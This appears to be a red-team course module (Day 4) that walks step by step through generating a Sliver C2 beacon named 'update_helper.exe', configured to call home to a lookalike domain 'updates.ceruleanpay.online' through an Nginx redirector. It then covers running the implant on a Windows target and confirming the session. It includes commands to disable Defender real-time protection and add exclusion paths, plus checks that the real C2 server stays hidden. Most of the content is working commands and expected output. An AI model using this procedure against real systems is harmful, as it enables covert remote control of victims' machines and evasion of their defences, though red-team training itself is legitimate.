# Day 4: Payload Generation, Execution & C2 Telemetry Verification

---

## Overview & Goal

Today we complete the full operational chain. We generate a stageless Sliver beacon payload, deploy it to a Windows 10/11 target VM, achieve an active C2 session through our Nginx domain redirector, and inspect network telemetry across all layers.

```
[ TARGET WINDOWS VM ] 
       |
       | HTTPS Beaconing (https://updates.ceruleanpay.online/updates/v2/sync)
       v
[ NGINX REDIRECTOR ] (Logs request in access.log, terminates TLS)
       |
       | Forwarded HTTPS (Port 8443)
       v
[ C2 SERVER (SLIVER) ] (Active Beacon Session Received)
```

---

## Step 1: Generate Beacon Payload in Sliver

> **Intent**: Compiles a 64-bit Windows stageless beacon EXE configured to check in via `updates.ceruleanpay.online/updates/v2/sync`.

SSH into `c2-server` and enter the Sliver interactive console:

```bash
ssh c2admin@C2_SERVER_IP
sudo sliver
```

### 1. Verify or Start HTTPS Listener (Port 8443)
Check if the HTTPS listener is running:

```
sliver > jobs
```

If no job is active, start the HTTPS listener on port 8443:

```
sliver > https --lport 8443
```

* **Expected Output**:
```
[*] Starting HTTPS :8443 listener ...
[!] Successfully started job #1
```

### 2. Generate Beacon Payload
Generate a stageless Windows EXE beacon targeting our redirector domain and secret path:

```
sliver > generate beacon --http updates.ceruleanpay.online/updates/v2/sync --seconds 15 --jitter 5 --os windows --arch amd64 --save /tmp/update_helper.exe https
```

### Command Flags Breakdown:
* `--http updates.ceruleanpay.online/updates/v2/sync`: Target domain and secret path handled by Nginx.
* `--seconds 15 --jitter 5`: Beacon check-in interval (every 10 to 20 seconds).
* `--os windows --arch amd64`: Windows 64-bit binary compile target.
* `--save /tmp/update_helper.exe`: Output path on C2 server.

* **Expected Output**:
```
[*] Compiling beacon implant...
[*] Build completed in 12s
[*] Implant saved to /tmp/update_helper.exe
```

---

## Step 2: Transfer Payload to Target Windows VM

> **Intent**: Moves the compiled binary from the C2 server to your operator workstation and onto the test target machine.

### 1. Fix File Permissions on C2 Server
Since Sliver runs as `root`, the generated payload `/tmp/update_helper.exe` is owned by `root`. Change permissions so `c2admin` can read and transfer it:

```bash
# On C2 Server terminal:
sudo chmod 644 /tmp/update_helper.exe
```

### 2. Copy to Workstation Terminal:
```bash
scp c2admin@C2_SERVER_IP:/tmp/update_helper.exe C:\Users\adversary\Desktop\update_helper.exe
```

### 2. Move to Target Computer:
Transfer `update_helper.exe` to your Windows 10/11 target VM (e.g. via SMB share or local file transfer).

*(Note: Disable Windows Defender Real-Time Protection during testing if using default un-obfuscated Sliver builds).*

---

## Step 3: Execute Payload & Verify Session in Sliver

> **Intent**: Runs the implant on the target computer and confirms an active beacon session appears in the Sliver console.

On the Target Windows computer, open PowerShell and execute the binary:

```powershell
.\update_helper.exe
```

Return to the Sliver console on `c2-server` and wait for check-in:

```
sliver > beacons
```

* **Expected Output**:
```
 ID         Name       Transport   Remote Address         Hostname      OS
========== ========== =========== ====================== ============= =============
 a1b2c3d4   UPDATE_H   https       20.120.45.12:443       WIN-TARGET    windows/amd64
```

### Interact with Beacon Session:
```
sliver > use a1b2c3d4
```

```
[*] Active beacon a1b2c3d4 (UPDATE_H)

sliver (UPDATE_H) > info
```

* **Output**: Displays Windows build details, process ID (PID), username, and active network interfaces.

---

## Step 4: Verify Network Telemetry Across All Layers

> **Intent**: Inspects target `netstat` and Nginx access logs to confirm complete IP isolation and OPSEC compliance.

### 1. Target Windows VM Telemetry (`netstat`)
In PowerShell on Windows target:
```powershell
Get-NetTCPConnection -RemotePort 443 | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
```
* **Observation**: Target connects exclusively to `REDIRECTOR_PUBLIC_IP:443`. It has **no knowledge or trace** of `C2_SERVER_IP`.

### 2. Nginx Redirector Access Logs
SSH into `redirector` VM and inspect Nginx access logs:
```bash
sudo tail -f /var/log/nginx/access.log
```
* **Expected Log Entry**:
```
157.50.74.229 - - [03/Jul/2026:10:45:00 +0000] "POST /updates/v2/sync HTTP/2.0" 200 4096 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```
*(Notice the `POST` request to `/updates/v2/sync` returning HTTP 200 OK).*

### 3. C2 Server Network Connection Verification
SSH into `c2-server` and inspect local connections on port 8443:
```bash
sudo ss -tulpn | grep 8443
```
* **Observation**: Port 8443 receives traffic coming exclusively from `REDIRECTOR_PUBLIC_IP`.

---

## Troubleshooting Egress & Connections

### Issue 1: Beacon does not check in
1. Check Nginx log on redirector: `sudo tail -n 20 /var/log/nginx/access.log`.
   * If requests show `200`, check Sliver console (`sliver > beacons`).
   * If requests show `499` or `502 Bad Gateway`, `c2-server` host firewall (UFW) or NSG is blocking port 8443. Run `sudo ufw allow 8443/tcp` on `c2-server`.
   * If requests show `404`, verify the secret path string matches exactly between Nginx `location` and Sliver `generate` command.
2. Check host firewall on Target: Ensure Defender real-time protection or Tamper Protection is disabled/excluded via `Add-MpPreference -ExclusionPath "C:\Users\adversary\Desktop"`.

### Issue 2: Nginx shows 499 Client Closed Request or 502 Bad Gateway
1. Verify `c2-server` UFW allows port 8443: `sudo ufw allow 8443/tcp`.
2. Test connection from `redirector` to `c2-server`: `curl -kv https://10.0.0.4:8443` (must return `< HTTP/1.1 404 Not Found`).
3. Verify Sliver HTTPS listener is running on `c2-server`: `sliver > jobs` (if empty, run `https --lport 8443`).

---

## Day 4 Summary Checklist

| Verification Point | Status | Observed Behavior |
|---|---|---|
| Payload Generation | Completed | `update_helper.exe` compiled successfully |
| Windows Target Execution | Verified | Executable runs without crash |
| Redirector Transit | Verified | Nginx logs show `POST /updates/v2/sync HTTP/2.0 200` |
| Sliver Session | Active | `beacons` command displays target `WIN-TARGET` |
| OPSEC Isolation | Confirmed | Target `netstat` shows zero connections to C2 IP |

---
**Course Complete!** You have successfully deployed, hardened, and verified a 2-tier C2 Redirection infrastructure.
